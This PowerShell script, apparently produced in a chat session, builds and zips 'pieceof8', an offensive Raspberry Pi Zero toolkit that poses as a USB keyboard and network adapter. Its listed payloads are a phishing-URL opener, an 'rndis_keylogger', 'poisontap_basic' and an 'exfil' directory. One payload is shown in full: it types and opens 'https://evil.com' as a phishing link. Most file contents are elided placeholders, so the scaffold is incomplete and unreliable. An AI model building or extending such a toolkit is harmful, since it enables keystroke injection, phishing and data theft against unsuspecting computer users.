# Set up repo root
$root = "pieceof8"
if (Test-Path $root) { Remove-Item $root -Recurse -Force }
mkdir $root

# Helper function to write file content
function Write-File($Path, $Content) {
    $dir = Split-Path $Path -Parent
    if (!(Test-Path $dir)) { mkdir $dir | Out-Null }
    Set-Content $Path $Content -NoNewline
}

# --- Write all files below ---

# README.md
$readme = @'
# pieceof8

A Bash Bunny-inspired offensive toolkit for the Raspberry Pi Zero 2 W  
Composite USB HID (keyboard) + RNDIS (Ethernet over USB) with a modular, web-managed payload system.

...

(Markdown content truncated for brevity; copy full README.md from previous answer!)
'@
Write-File "$root\README.md" $readme

# install.sh
$install = @'
#!/bin/bash
set -e
echo "[*] Installing dependencies..."
...
(Full install.sh content here)
'@
Write-File "$root\install.sh" $install

# usb-gadget.service
$usbGadgetService = @'
[Unit]
Description=USB HID+RNDIS Gadget
DefaultDependencies=no
After=local-fs.target
Before=network.target
...
'@
Write-File "$root\usb-gadget.service" $usbGadgetService

# setup_usb_gadget.sh
$setupUsbGadget = @'
#!/bin/bash
set -e
cd /sys/kernel/config/usb_gadget/
...
'@
Write-File "$root\setup_usb_gadget.sh" $setupUsbGadget

# payloads.service
$payloadsService = @'
[Unit]
Description=Run Pi HID+RNDIS Payloads at boot
After=network.target usb-gadget.service
...
'@
Write-File "$root\payloads.service" $payloadsService

# payloads\autorun.sh
$autorun = @'
#!/bin/bash
# Main autorun script (Bash Bunny style)
...
'@
Write-File "$root\payloads\autorun.sh" $autorun

# payloads\selected
Write-File "$root\payloads\selected" "hid_open_url"

# payloads\web_selector.py
$webSelectorPy = @'
import os
import json
from flask import Flask, render_template_string, request, redirect, url_for, send_from_directory
...
'@
Write-File "$root\payloads\web_selector.py" $webSelectorPy

# payloads\web_selector.service
$webSelectorSvc = @'
[Unit]
Description=Web Payload Selector
After=network-online.target
...
'@
Write-File "$root\payloads\web_selector.service" $webSelectorSvc

# Example payloads (hid_open_url, rndis_keylogger, poisontap_basic, etc.)

# For each payload, repeat the pattern:
# - meta.json
# - run.sh
# - send_keys.py (for HID payloads)
# (Paste full content from previous answer for each!)

Write-File "$root\payloads\hid_open_url\meta.json" @'
{
  "name": "Open phishing URL",
  "description": "Types and opens a phishing URL in the default browser.",
  "author": "blackbeardsghost251",
  "created": "2025-06-04"
}
'@
Write-File "$root\payloads\hid_open_url\run.sh" @'
#!/bin/bash
sleep 2
python3 send_keys.py 'https://evil.com\n'
sleep 1
'@
Write-File "$root\payloads\hid_open_url\send_keys.py" @'
import sys
import time
...
'@

# Repeat for rndis_keylogger and other payloads...

# --- End of file creation ---

# Create exfil directory
New-Item -ItemType Directory -Path "$root\exfil" | Out-Null

# Zip the whole thing
if (Test-Path "$root.zip") { Remove-Item "$root.zip" }
Compress-Archive -Path $root\* -DestinationPath "$root.zip"

Write-Host "All done! Your package is $root.zip"